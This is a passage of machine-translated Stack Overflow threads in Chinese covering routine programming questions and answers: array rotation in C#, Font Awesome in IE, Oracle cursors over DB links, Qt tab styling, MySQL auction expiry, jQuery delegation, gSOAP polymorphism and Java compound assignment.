我可能会输入 5 个数字 48390，如果您注意到它的数字相同但有一个数字输出。我想要一个 while 循环来旋转 4 ar[1] 直到数字形成 04839

我希望这是有道理的。我发布这个问题是因为大多数页面都发布了基于将所有元素向右移动的信息，而我真的只想移动一个特定的元素。

感谢您的关注。

编辑：我应该更具体。如果您不知道每个数组元素可能是什么怎么办？所以我不能依赖“0”作为锚点。因为另一组数字可能包括另一个数字，例如“00238”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:56:31.237

此方法将为您提供通过将单个元素插入（之间）给定数组中的每个位置而制成的数组序列：

```
public static IEnumerable<T[]> InsertElementBetweenAllPositions<T>(
    T[] array, T element)
{
    int newLength = array.Length + 1;
    for (int i = 0; i < newLength; i++)
    {
        T[] rtn = new T[newLength];
        rtn[i] = element;
        Array.Copy(array, 0, rtn, 0, i);
        Array.Copy(array, i, rtn, i + 1, array.Length - i);
        yield return rtn;
    }
} 
```

对于您的示例，您可以将其称为

```
foreach (int[] arr in InsertElementBetweenAllPositions(new[] { 6, 7, 8, 9 }, 0))
{
    foreach (int i in arr)
        Console.Write(i + " ");
    Console.WriteLine();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T14:53:06.893

这个怎么样：

```
 List<int> l = new List<int>(){0,6,7,8,9};

            for (int i=1;i<5;i++)
            {
                l.Remove(0);
                l.Insert(i, 0);
            } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T14:52:20.247

您的示例中的内容是交换，可以像这样实现：

```
private void Swap(ref int[] array, int index1, int index2)
{
    int temp = array[index1];
    array[index1] = array[index2];
    array[index2] = temp;
} 
```

调用`Swap(ref source, 0, 1)`将交换第一个和第二个元素。那么你想要的是：

```
for (int i = 0; i < a.Length-1; i++)
{
    Swap(ref a, i, i+1);
} 
```

这会将第一个元素“冒泡”到每次迭代中的最后一个位置。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-11T15:10:07.897

从示例中，您需要移动元素，并且该示例对于是否需要将它们循环到重新开始有点混乱。我提供了以下示例，它将循环到开始 - 如果您不需要这样做，您可以重新编写 if 语句。

```
private int[] Shift(int[] a)
{
    int zeroPos = Array.IndexOf(a, 0);

    int[] rtn = new int[a.Length];
    a.CopyTo(rtn, 0);

    if (zeroPos + 1 == a.Length)
    {
        rtn[0] = 0;
        for (int i = 0; i < a.Length - 1; i++)
        {
            rtn[i + 1] = a[i];
        }
    }
    else
    {
        rtn[zeroPos] = rtn[zeroPos + 1];
        rtn[zeroPos + 1] = 0;
    }

    return rtn;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-11T14:57:49.867

也许

```
int oldLast = ar[ar.Length - 1];
for (int i = ar.Length - 1; i >= 0; i--)
    ar[i] = i == 0 ? oldLast : ar[i - 1]; 
```

[**演示**](http://ideone.com/sxR1hT)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-11T14:52:33.167

```
r=ar[0];

for (int i = 0; ar.lenght;i++)
{
ar[i]=ar[i + 1];
}

ar[ar.lenght] = r; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-11T15:12:20.863

它只是一个项的排列，下面是排列算法的完整源代码。

```
 static List<string> Put(char s1, string list)
    {
        List<string> str =new List<string>();

        for (int i = 0; i < list.Length+1; i++)
        {
            string s = list.Substring(0, i) + s1.ToString() + list.Substring(i);
            str.Add(s);
        }
        return str;
    }
    static List<string> Permute(string list,int x)
    {
        List<string> Result = new List<string>();
        if (list.Length == 1)
        {
            Result.Add(list[0].ToString());
            return Result;
        }
        else
        {

            char first = list[0];
            list = list.Substring(x+1);
            List<string> part = Permute(list,0);
            foreach (string str in part)
            {
                  List<string> hasBeenPlaced = Put(first, str);
                  foreach (string str2 in hasBeenPlaced)
                  {
                        Result.Add(str2);
                  }
            }

        }

        return Result;
    }
    static void Main(string[] args)
    {

        List<string> per = Permute("abc",0);
        for (int i = 0; i < per.Count; i++)
        {
            Console.WriteLine(per[i]);
        }
        Console.ReadKey();
    } 
```

现在如果我在 foreach 之后添加一个 break，你的问题就解决了。（它只会为您想要的一个项目写入所有排列，而不是全部......）所以将其更改为：

```
 foreach (string str in part)
        {
            List<string> hasBeenPlaced = Put(first, str);
            foreach (string str2 in hasBeenPlaced)
            {
                Result.Add(str2);
            }
            break;
        } 
```

希望对你有所帮助

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-11T14:50:23.130

您是否考虑过使用[LinkedList](http://msdn.microsoft.com/en-us/library/he2s3bh7.aspx)代替？链表数据结构可能比数组更适合您尝试做的事情。AddFirst、AddLast、AddAfter 和 AddBefore 方法允许您以比每次重新组织数组更有效的方式将元素插入到列表中。

链表的缺点是需要按顺序读取元素。因此，插入/删除元素非常有效，但随机访问元素效率低下。

[这里](http://www.dotnetperls.com/linkedlist)有一个很好的 LinkedLists 概述。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-07-30T23:48:35.333

如果您使用 linq，那很简单 :-) 但是您需要比数组更大的大小。

```
ShiftLeft(ar, 1);

private static int[] ShiftLeft(int[] value, int countOfShift = 1)
{
    var length = value.Length;

    if (countOfShift > length)
    {
        throw new InvalidOperationException("countOfShift must less then value's length.");
    }

    var tempList = new List<int>(value);

    tempList.RemoveRange(length - countOfShift, countOfShift);
    tempList.InsertRange(0, value.Skip(length - countOfShift));

    return tempList.ToArray();
} 
```

# internet-explorer - 为什么在 IE 中不加载 Font Awesome？

> ID：13822178
> 
> 赞同：0
> 
> 时间：2012-12-11T14:47:28.927
> 
> 标签：internet-explorer, cross-browser, font-awesome

在所有版本的 IE 中， Font Awesome 图标都无法在[该网站](https://archify.com/)上加载（它在 Chrome、Safari、Firefox 和 Opera 中完美显示）。我应该在以下条件 IE 语句中加载 IE7+ 对 Font Awesome 的支持：

```
<!--[if lt IE 9]>
    <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->

<!--[if IE 7]>
    <link rel="stylesheet" href="/css_archify/font-awesome-ie7.css">
<![endif]--> 
```

我在两者之间加载了默认的 Font Awesome CSS，只是为了确保`:before`伪`:after`元素在用于以下任何样式表之前得到支持。任何想法为什么这些图标没有出现在 IE 上？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T09:02:58.887

在从 Font-Awesome 检查 CSS 之前，您需要修复**脚本错误**，我知道 Font-Awesome 在 Quirks 模式下加载不正确，但**它是 IE7**并且它使用 CSS 规则和 javascript 的混合。

在 IE7 中，如果您有一个 javascript 行引发错误，它将停止执行其余代码。

![在此处输入图像描述](../Images/b92e20b814170152deb127806aca3d19.png)

给自己一个测试，创建一个只有一些 Font-Awesome 图标的空白页面，没有任何 javascript 插件，看看它是否正确加载。

# oracle - 在 Oracle 中访问 db 链接上的光标

> ID：13822181
> 
> 赞同：1
> 
> 时间：2012-12-11T14:47:33.620
> 
> 标签：oracle, cursor, dblink

我必须编写一个通过数据库链接调用远程过程的存储过程。此过程返回一个游标。当我尝试遍历此游标时，我得到 ORA-01001：无效游标错误。我在一些论坛上读到，根本不允许通过数据库链接访问游标，但我不相信这一点。有谁知道如何解决它？这里重要的是我不能修改现有的远程方法。

以下是我的程序代码：

```
declare
  TYPE generic_cursor IS REF CURSOR;
  refCursorValue generic_cursor;  
 field1 table1.column1@my_db_link%type;
begin

  rempote_package.remote_method@my_db_link('33337136','','',refCursorValue);

 loop
      fetch refCursorValue into  field1;      -- here exception is thrown               
      exit when refCursorValue%NOTFOUND;
  end loop;
  close refCursorValue;
end; 
```

远程方法接口如下：

```
PROCEDURE remoteMethod (p1 IN VARCHAR2,
 p2 IN VARCHAR2,
 p3 IN VARCHAR2,
 rst_data OUT pkg_resultset.generic_cursor) 
```

并且 pkg_resultset.generic_cursor 有以下定义：

```
 TYPE generic_cursor IS REF CURSOR; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-09T22:16:38.490

据我所知，您不能将引用光标传递到数据库链接上。但你可以通过一张桌子。从 Ask Tom 看这个例子：http://asktom.oracle.com/pls/asktom/f?p=100:11:0::::P11_QUESTION_ID: [4254116170549](http://asktom.oracle.com/pls/asktom/f?p=100:11:0::::P11_QUESTION_ID:4254116170549)

# c++ - QTabBar::setTabButton 中心按钮

> ID：13822186
> 
> 赞同：0
> 
> 时间：2012-12-11T14:47:47.880
> 
> 标签：c++, qt, styles

我正在尝试通过使其显示为斜体来自定义 Qt/C++ 中的 QTabBar 按钮，我发现的唯一方法是使用 setTabButton 并为其提供自定义小部件，在我的情况下这是一个 QLabel。但是，setTabButton 的位置参数只有 Left 或 Right 作为选项（参见下面的代码）。现在它在所有居中的其他选项卡旁边看起来很奇怪。

```
tab_bar->setTabButton(index, QTabBar::RightSide,((QWidget*)(tab_label))); 
```

请注意，有一个应用于整个应用程序的样式表......不确定这是否会导致问题更加明显。

该标签的样式表是：

```
QLabel#GrainButton {
    background-color: transparent;
    border: 0px solid transparent;
    margin: 0px;
    padding: 0px;
    min-width: 20px;
    border: 0px solid transparent;
    border-radius: 0px;
} 
```

关于如何居中的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T14:59:56.843

您可以创建自定义小部件而不是您的 QLabel。在此小部件中，您可以设置带有 2 个占位符小部件的 QHBoxLayout。

```
QHBoxLayout:
    PlaceHolder( sizePolicy(QSizePolicy::Expanding, QSizePolicy::Fixed); )
    YourLabel
    PlaceHolder( sizePolicy(QSizePolicy::Expanding, QSizePolicy::Fixed); ) 
```

这可能会将您的小部件放在中心。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-07-08T01:49:09.517

继承 QProxyStyle 并覆盖 drawItemPixmap，像素图将显示在中心。

# php - mysql 事件调度是适当（或最佳）的解决方案吗？

> ID：13822188
> 
> 赞同：0
> 
> 时间：2012-12-11T14:47:02.600
> 
> 标签：php, mysql

基本上我只想知道我是否有正确的想法或者是否存在更好的想法。

我有一个数据库，用于存储网站上当前正在进行的（或将要进行的）拍卖。显然，拍卖会结束。我对网络开发很陌生，只是想知道将数据库中的拍卖状态更改为“过期”的最佳方法。

我正在使用 phpmyadmin 和 mysql 并阅读了一些关于 mysql 事件调度程序的信息。据我所知，他们似乎是这样做的好方法。在此基础上，我肯定只是每分钟运行一次定期事件，例如，它会根据拍卖的预定完成时间检查当前时间，然后在需要时进行更改？这个对吗？此外，我还可以将过期的拍卖移至旧存档 - 您认为这可能是优化我的数据库性能的最佳方法吗？

否则我只是想知道是否有更好（或更简单的方法）做同样的事情。例如，像 ebay 这样的网站是如何进行的？非常感谢您提前抽出时间。

PS我意识到这更像是一个概念问题，而不是任何具体问题。不过，我希望它可以问！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T14:52:07.907

你太复杂了。您不需要在拍卖到期时实际更改拍卖的状态。从到期日起，状态已经不言自明。如果您在数据库中有列`expiry_time`，那么在拍卖活动之前的任何时间，在它过期之后的任何时间。就如此容易。使用适当的查询，像这样查找所有有效的拍卖：

```
SELECT * FROM `auctions` WHERE `expiry_time` > NOW() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T14:54:03.807

你可以这样做，但我会建议另一种方法。这是我自己实现的（在游戏中，但具有相同的机制），它就像一个魅力。

您唯一需要做的就是在每次页面加载时（在其他任何事情之前）运行一个函数，并检查是否需要将任何内容移动到存档中。如果有什么需要注意的，那就去做吧。

如果您这样做，您就会知道访问者看到的页面总是会更新。如果您使用某种类型的 cron_job 或您所说的事件，其中一些拍卖可能会在作业执行几秒钟后“过期”，因此显示为不正确的活动状态将近一分钟。

# javascript - 为 AJAX 加载的数据设置 jQuery 事件处理程序

> ID：13822189
> 
> 赞同：9
> 
> 时间：2012-12-11T14:47:49.970
> 
> 标签：javascript, ajax, jquery, javascript-events

作为 jQuery 和 AJAX 基础知识的新手，我一直在尝试设置一些相当简单的动态加载。

我包含一个 .js 文件来设置点击事件处理程序，它看起来像这样：

```
var baseurl = document.getElementById("baseurl").getAttribute("href");
var pattern = new RegExp("[^/]+");
var page = "cnt/" + pattern.exec(window.location.href.substr(baseurl.length)) + ".php";

$(document).ready(function(){
    $('a.ajax').bind('click',function(event){
        event.preventDefault();
        $('#content').load("cnt/" + pattern.exec(this.href.substr(baseurl.length)) + ".php")
    })
}); 
```

请注意，我对文件进行了一些更改，因此相对 href "testing/" 将变成文件 "cnt/testing.php" 的绝对路径。

我的锚标签如下所示：

```
<a href="testing/" class="ajax">Link to testing page</a> 
```

我的问题是，每当将新内容加载到 div#content 中时，我的 .js 文件中的处理程序都没有注册任何可能使用 AJAX 出现的链接。换句话说，链接将简单地充当普通的锚标签。我希望它使用 AJAX 加载下一页，就像它加载第一页一样。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-11T14:49:56.020

如果您要插入新内容，则该内容将是动态的，并且事件处理程序只能绑定到实际存在的元素。您需要将事件委托给在附加事件处理程序时存在的 DOM 中更高的元素。我将使用该文档，您将使用最近的非动态父级委托给：

```
$(document).on('click', '.ajax', function(event){
    event.preventDefault();
    $('#content').load("cnt/" + pattern.exec(this.href.substr(baseurl.length)) + ".php")
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T14:50:09.890

using`$('a.ajax').live('click', stuff here)`将处理所有带有“ajax”类的链接，只要它们碰巧被添加。

# c++ - 布尔函数的错误答案

> ID：13822190
> 
> 赞同：-5
> 
> 时间：2012-12-11T14:47:51.423
> 
> 标签：c++, vector, boolean

我的布尔函数 check_gift 无法正常工作。

我将一个 txt 文件复制到矢量礼品店中。现在我想检查给定的商品是否在商店中。为了测试函数 check_gift，我从实际的 txt 文件中获取了一个项目，但该函数给出了错误的答案。它返回 false 而不是 true。

我究竟做错了什么？

```
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdlib>
#include <string>
#include <cassert>
using namespace std;

typedef vector<string> Wishes;

int size(Wishes& w){ return static_cast<int>(w.size()); }

struct Wishlist
{
      double budget;
      Wishes wishes;
};

struct Gift
{
    double price;
    string name;
};

 typedef vector<Gift> Giftstore;

 int size(Giftstore& g) { return static_cast<int>(g.size()); }

void read_wishlist_into_struct(ifstream& infile, Wishlist& wishlist)
{
    double b;
    infile>>b;
    wishlist.budget=b;

    int i=0;
    string name;
    getline(infile,name);

    while(infile)
    {
        wishlist.wishes.push_back(name);
        i++;
        getline(infile,name);
    }
    infile.close();
}

void show_wishlist(Wishlist wishlist)
{
    cout<<"Budget: "<<wishlist.budget<<endl<<endl;
    cout<<"Wishes: "<<endl;
    for(int i=0; i<size(wishlist.wishes); i++)
    {
        cout<<wishlist.wishes[i]<<endl;
    }
    cout<<endl;
}

void read_giftstore_into_vector(ifstream& infile, Gift& gift, Giftstore& giftstore)
{
    double p;
    string name;
    int i=0;
    infile>>p;

    while(infile)
    {
        gift.price=p;
        getline(infile,name);
        gift.name=name;

        giftstore.push_back(gift);
        i++;
        infile>>p;
    }
    infile.close();
}

void show_giftstore(Giftstore giftstore)
{
    cout<<"All possible gifts in giftstore: "<<endl<<endl;

    for(int i=0; i<giftstore.size(); i++)
    {
        cout<<giftstore[i].price<<"\t"<<giftstore[i].name<<endl;
    }
    cout<<endl;
}

bool check_gift(Giftstore giftstore, string giftname)
{
    int i=0;

    while(i<size(giftstore))
    {
        if(giftstore[i].name==giftname)
        {
            cout<<"Yes"<<endl;
            return true;
        }
        else
        {
            i++;
        }
    }
    return false;
}

void clear(Wishlist& b)
{
    b.budget=0;

    while(!b.wishes.empty())
    {
        b.wishes.pop_back();
    }
}

void copy(Wishlist a, Wishlist& b)
{
    b.budget=a.budget;

    for (int i=0; i<size(b.wishes); i++)
    {
    b.wishes.push_back(a.wishes[i]);
    }
}

int main ()
{

    ifstream infile2("giftstore.txt");

    Gift gift;
    Giftstore giftstore;

    read_giftstore_into_vector(infile2, gift, giftstore);
    show_giftstore(giftstore);

    string giftname;
    giftname="dvd Up van Pixar";
    bool x;

    x=check_gift(giftstore, giftname);
    cout<<"in store?: "<<x<<endl;
return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:25:51.390

了解如何调试。如果您无法通过代码逐行跟踪，请尝试保留某种日志。

现在至少将其输出到控制台。

在您的情况下 1\. 验证输入文件已成功打开 2\. 在您阅读时打印出每个礼物。

将是一个很好的开始方式。

如果您希望能够放入多个日志语句然后稍后将其删除，您可以使用可以在一个地方关闭的宏。

对于继续投入生产的大型项目，日志记录是一项相当棘手的技能，但是您应该在短期内学习如何使用它来调试您的程序。

我们在这里甚至看不到您的输入文件中的内容。这就是人们对您的问题投反对票的原因。

好的：现在你告诉我你的问题是你需要从你读入的每个字符串的前面修剪空格。

有多种方法可以做到这一点，但

```
trimmed = s.substr( s.find_first_not_of(" \n\r\t" ) ); 
```

现在可能会工作。

但是我原来的答案仍然成立：请学习调试。如果您在读入字符串时输出了这些字符串，您会看到这些前导空格。

# c++ - 如何在 gSOAP 中绑定多态类型

> ID：13822197
> 
> 赞同：4
> 
> 时间：2012-12-11T14:48:01.267
> 
> 标签：c++, xml, gsoap

我正在尝试做的，利用 gSOAP：

1.  在 XML 模式中定义数据结构
2.  使用 wsdl2h 和 soapcpp2 生成代表这些结构的 C++ 类
3.  从 C++ 读取和写入 XML 中的这些结构

请注意，此时我没有使用 Web 服务，我只是对 XML 数据绑定感兴趣。

如果我的课程看起来像：

类基{ ... }

Der1 类：公共基础 { .. }

Der2 类：公共基础 { ... }

然后我可以使用以下方法序列化 Base 对象（实际上可能是派生类型之一）：

```
std::ofstream myFile;
myFile.open("output.out");
ctx.os = &myFile; 

Der1 obj; // or Der2 obj...
// ... populate obj

if (soap_write_Base(ctx, dynamic_cast<Base*>(&obj)) == SOAP_OK)
{ 
  std::cout << "message serialized" << std::endl;
} else 
{
  soap_print_fault(ctx, stderr);
} 
```

并使用反序列化：

```
std::ifstream myFile;
myFile.open("output.out");

ctx.is = &myFile;
Der1 obj;

if (soap_read_Der1(ctx, &obj) == SOAP_OK)
{
  std::cout << "message deserialized" << std::endl;
  printMessage(msg); //debug
} else 
{
  soap_print_fault(ctx, stderr);
} 
```

其中 ctx 是指向soap上下文的指针，声明为：

```
soap* ctx = soap_new2(SOAP_XML_STRICT, SOAP_XML_INDENT); 
```

代码的其他地方。

谁能告诉我如何更改上面的反序列化代码以便能够在不预先知道它是 Der1、Der2 还是 Base 对象的情况下读取对象？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-06-10T23:30:02.810

您需要做几件事。

首先，构建您的 C++ 对象，以便它们派生自`xsd__anyType`（上的`-p`选项`wsdl2h`）

当你编译你的代码时，定义`WITH_NO_IO`这样`WITH_NO_HTTP`你就不会得到默认的 gSoap HTTP 和 IO 调用。

然后，创建一个`Serializer`类（请原谅关于 XML 的咆哮）：

```
#pragma once
#include <memory>

namespace MyLib
{
    class SerializerImpl;
    class xsd__anyType;
    class Serializer
    {
        std::shared_ptr<SerializerImpl> ser;
    public:
        Serializer();
        Serializer(Serializer const &) = default;
        Serializer(Serializer &&o) : ser(std::forward<Serializer>(o).ser) { }
        ~Serializer() = default;

        Serializer &operator=(Serializer const& rhs) = default;
        Serializer &operator=(Serializer && rhs)
        {
            ser = std::forward<Serializer>(rhs).ser;
            return *this;
        }

        // Serialize 'value' into 'out'.
        void Serialize(xsd__anyType const &value, std::ostream &out);

        // Returns a shared pointer to the xsd_anyType that comes in 'in'.
        // The shared_ptr returned contains a custom deleter because gSoap ties
        // allocated values to the gSoap context used to deserialize it in the
        // first place. I think that was an attempt at adding some kind of
        // garbage collection so one didn't have to worry about deleting it except,
        // of course, that fails if you get rid of the context prior to the
        // end of the life of the deserialized value. Nobody does XML C++ bindings
        // right. XML sucks and C++ doesn't and it is hard to translate suck to 
        // non-suck.
        std::shared_ptr<xsd__anyType> Deserialize(std::istream &in);
    };
} 
```

实现看起来像：

```
#include "MyLibH.h"
#include "stdsoap2.h"
#include "Serializer.h"

namespace MyLib
{
    static int fsend(struct soap* ctx, char const *buf, size_t len)
    {
        if (!ctx->os)
        {
            throw std::logic_error("soap.fsend the struct soap 'os' member must be set.");
        }

        ctx->os->write(buf, len);
        return SOAP_OK;
    }

    static size_t frecv(struct soap* ctx, char* buf, size_t len)
    {
        if (!ctx->is)
        {
            throw std::logic_error("soap.fsend the struct soap 'is' member must be set.");
        }

        ctx->is->read(buf, len);
        return ctx->is->gcount();
    }

    static SOAP_SOCKET fopen(struct soap*, const char*, const char*, int)
    {
        throw std::logic_error("soap.fopen not implemented for Serializer.");
    }

    static int fclose(struct soap *ctx)
    {
        return SOAP_OK;
    }

    static int fclosesocket(struct soap*, SOAP_SOCKET)
    {
        throw std::logic_error("soap.fclosesocket not implemented for Serializer.");
    }

    static int fshutdownsocket(struct soap*, SOAP_SOCKET, int)
    {
        throw std::logic_error("soap.fshutdownsocket not implemented for Serializer.");
    }

    static SOAP_SOCKET faccept(struct soap*, SOAP_SOCKET, struct sockaddr*, int *n)
    {
        throw std::logic_error("soap.faccept not implemented for Serializer.");
    }

    class SerializerImpl
    {
        struct soap mutable soap;
    public:
        SerializerImpl();
        ~SerializerImpl();
        struct soap *ctx() const { return &soap; }
    };

    SerializerImpl::SerializerImpl()
    {
        soap_init(&soap);

        // compiled with WITH_NOIO so set these function pointers
        soap.fsend = fsend;
        soap.frecv = frecv;
        soap.fopen = fopen;
        soap.fclose = fclose;
        soap.fclosesocket = fclosesocket;
        soap.fshutdownsocket = fshutdownsocket;
        soap.fpoll = nullptr;
        soap.faccept = faccept;

        // Set input/output mode
        soap_imode(&soap, SOAP_ENC_XML);
        soap_set_omode(&soap, SOAP_XML_INDENT);
    }

    SerializerImpl::~SerializerImpl()
    {
        // remove deserialized class instances (C++ objects)
        soap_destroy(&soap);

        // clean up and remove deserialized data 
        soap_end(&soap);

        // detach context (last use and no longer in scope)
        soap_done(&soap);
    }

    Serializer::Serializer() : ser(std::make_shared<SerializerImpl>())
    {
    }

    void Serializer::Serialize(xsd__anyType const& value, std::ostream &out)
    {
        soap_begin(ser->ctx());
        ser->ctx()->is = &in;
        soap_free_temp(ser->ctx());
        int type;
        int err;
        char errbuf[200];
        if ((err = soap_begin_recv(ser->ctx())) != SOAP_OK)
        {
            _snprintf_s(
                errbuf, 
                sizeof(errbuf), 
                _TRUNCATE, 
                "Serializer::Deserialize failed soap_begin_recv: %d", 
                err);
            errbuf[sizeof(errbuf) - 1] = 0;
            throw std::exception(errbuf);
        }

        // Create a deleter for the element returned from 'soap_getelement()'
        auto serializerImpl = this->ser;
        auto deleteElement = [serializerImpl](void *toDelete)
        {
            soap_dealloc(serializerImpl->ctx(), toDelete);
        };

        // parse the XML into an element
        std::unique_ptr<void, decltype(deleteElement)>
            res(soap_getelement(ser->ctx(), &type), deleteElement);
        if (!res)
        {
            // populate ser->ctx()->msgbuf with more detailed information
            soap_set_fault(ser->ctx());
            if (ser->ctx()->msgbuf)
            {
                _snprintf_s(
                    errbuf, 
                    sizeof(errbuf), 
                    _TRUNCATE, 
                    "Serializer::Deserialize failed soap_getelement: %s",
                    ser->ctx()->msgbuf);
            }
            else
            {
                _snprintf_s(
                    errbuf, 
                    sizeof(errbuf), 
                    _TRUNCATE, 
                    "Serializer::Deserialize failed soap_getelement: %d",
                    ser->ctx()->error);
            }

            errbuf[sizeof(errbuf) - 1] = 0;
            throw std::exception(errbuf);
        }

        if ((err = soap_end_recv(ser->ctx())) != SOAP_OK)
        {
            _snprintf_s(
                errbuf, 
                sizeof(errbuf), 
                _TRUNCATE, 
                "Serializer::Deserialize failed soap_end_recv: %d", 
                err);
            errbuf[sizeof(errbuf) - 1] = 0;
            throw std::exception(errbuf);
        }
        // anything that can be cast as an xml_Any gets cast here
        switch (type)
        {
         case SOAP_TYPE_MyLib_ns1__FooType:
         case SOAP_TYPE_MyLib_ns1__BarType:
         case SOAP_TYPE_MyLib_ns1__BazType:
            // In theory, res is a subclass of xsd_anyType, so cast 
            // it here as if it was
            auto anyType = static_cast<xsd__anyType *>(res.release());

            // build a shared pointer with the custom deleter that keeps serializerImpl
            auto ret = std::shared_ptr<xsd__anyType>(anyType, deleteElement);
            return ret;
        }

        _snprintf_s(
            errbuf, 
            sizeof(errbuf), 
            _TRUNCATE, 
            "Serializer::Deserialize failed - "
            "unsupported cast of type %d to xsd__anyType", 
            type);
        errbuf[sizeof(errbuf) - 1] = 0;
        throw std::exception(errbuf);
    }
} 
```

使用这个类，您可以创建一个`Serializer ser;`then do`ser.Serialize(myEntity, myOutputStream);`或`auto myEntity = ser.Deserialize(myInputStream);`.

`Deserialize()`您可以在它调用的方法中看到多态反序列化的秘密，该方法`soap_getelement()`为它可以反序列化的任何类型返回一个 void 指针。然后，如果类型是已知基于 a 的类型`xsd__anyType`，那么它会`shared_ptr<xsd__anyType>`使用自定义删除方法强制转换为 a ，该方法保留`struct soap`上下文，以便它可以以适当的 gSoap 方式删除。转换为的能力`xsd__anyType`是我们告诉`wsdl2h`使用选项从该类型派生所有类型的原因`-p`。

请注意，要让它为我工作，我必须创建一些其他功能。*我*`wsdl2h`用and构建源代码`soapcpp2`的方式`WITH_NOGLOBAL`得到了定义。这导致了一些未定义的功能。我通过以下方式进行定义：

```
#include "MyLib3.nsmap"

SOAP_FMAC3 const char ** SOAP_FMAC4 soap_faultcode(struct soap *soap)
{
    static char const *ret;
    ret = nullptr;
    return &ret;
}

SOAP_FMAC3 const char ** SOAP_FMAC4 soap_faultsubcode(struct soap *soap)
{
    static char const *ret;
    ret = nullptr;
    return &ret;
}

SOAP_FMAC3 const char ** SOAP_FMAC4 soap_faultstring(struct soap *soap)
{
    static char const *ret;
    ret = nullptr;
    return &ret;
}

SOAP_FMAC3 const char ** SOAP_FMAC4 soap_faultdetail(struct soap *soap)
{
    static char const *ret;
    ret = nullptr;
    return &ret;
}

SOAP_FMAC3 const char * SOAP_FMAC4 soap_check_faultsubcode(struct soap *soap)
{
    return nullptr;
}

SOAP_FMAC3 const char * SOAP_FMAC4 soap_check_faultdetail(struct soap *soap)
{
    return nullptr;
}

SOAP_FMAC3 void SOAP_FMAC4 soap_serializefault(struct soap *soap)
{
}

SOAP_FMAC3 void SOAP_FMAC4 soap_serializeheader(struct soap *soap)
{
}

SOAP_FMAC3 int SOAP_FMAC4 soap_putheader(struct soap *soap)
{
    return SOAP_OK;
}

SOAP_FMAC3 int SOAP_FMAC4 soap_getfault(struct soap *soap)
{
    return SOAP_OK;
}

SOAP_FMAC3 int SOAP_FMAC4 soap_putfault(struct soap *soap)
{
    return SOAP_OK;
}

SOAP_FMAC3 int SOAP_FMAC4 soap_getheader(struct soap *soap)
{
    return SOAP_OK;
} 
```

# java - 基元 float 和 double：为什么 f+=d 不会导致类型不匹配错误？

> ID：13822199
> 
> 赞同：5
> 
> 时间：2012-12-11T14:48:10.000
> 
> 标签：java, primitive

> **可能重复：**
> [Java += 运算符](https://stackoverflow.com/questions/8710619/java-operator)

代码示例：

```
 double d = 1;
    float f = 2;
    f += d;  // no error?
    f = f+d; // type mismatch error, should be f = (float) (f+d); 
```

那么为什么不会`f+=d` **产生**错误（即使在运行时也不会），尽管这会降低`d`?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T14:51:18.593

根据[JLS 15.26.2](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.26.2)

> E1 op= E2 形式的复合赋值表达式等价于 E1 = (T) ((E1) op (E2))，其中 T 是 E1 的类型，除了 E1 只计算一次。

这意味着：

```
f += d; 
```

会变成

`f = (float) (f+d);`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-11T14:52:50.420

复合赋值执行隐式强制转换。

```
a #= b; 
```

相当于

```
a = (cast to type of a) (a # b); 
```

另一个例子

```
char ch = '0';
ch *= 1.1; // same as ch = (char)(ch * 1.1);
// ch is now '4' 
```

# ssl - Axis2 版本 1.3 异常 org.apache.axiom.om.OMException: javax.xml.stream.XMLStreamException: end

> ID：13822200
> 
> 赞同：2
> 
> 时间：2012-12-11T14:48:12.703
> 
> 标签：ssl, axis2

尝试通过 SSL 对另一个服务进行 SOAP 调用时，我得到一个相当无用的堆栈跟踪。我正在使用（叹气）Axis2 1.3 版。未经检查`OMException`的来自 axiom-api 版本 1.2.5，它包装了底层`XMLStreamException`- 以及不太有用的“到达终点！” 消息（是的，它甚至有一个感叹号）。

我会说远程系统返回了某种意外响应，而 Axis2 不知道如何处理它，但如果有人有的话，我想要更详细的解释。

```
org.apache.axiom.om.OMException: javax.xml.stream.XMLStreamException: end reached!
at org.apache.axiom.om.impl.builder.StAXOMBuilder.next(StAXOMBuilder.java:239)
at org.apache.axiom.om.impl.llom.OMStAXWrapper.updateNextNode(OMStAXWrapper.java:1014)
at org.apache.axiom.om.impl.llom.OMStAXWrapper.<init>(OMStAXWrapper.java:179)
at org.apache.axiom.om.impl.llom.OMElementImpl.getXMLStreamReader(OMElementImpl.java:655)
at org.apache.axiom.om.impl.llom.OMElementImpl.getXMLStreamReaderWithoutCaching(OMElementImpl.java:634)
at org.apache.axiom.om.impl.util.OMSerializerUtil.serializeByPullStream(OMSerializerUtil.java:523)
at org.apache.axiom.om.impl.llom.OMElementImpl.internalSerialize(OMElementImpl.java:789)
at org.apache.axiom.om.impl.llom.OMElementImpl.internalSerializeAndConsume(OMElementImpl.java:814)
at org.apache.axiom.soap.impl.llom.SOAPEnvelopeImpl.serializeInternally(SOAPEnvelopeImpl.java:237)
at org.apache.axiom.soap.impl.llom.SOAPEnvelopeImpl.internalSerialize(SOAPEnvelopeImpl.java:225)
at org.apache.axiom.om.impl.llom.OMElementImpl.internalSerializeAndConsume(OMElementImpl.java:814)
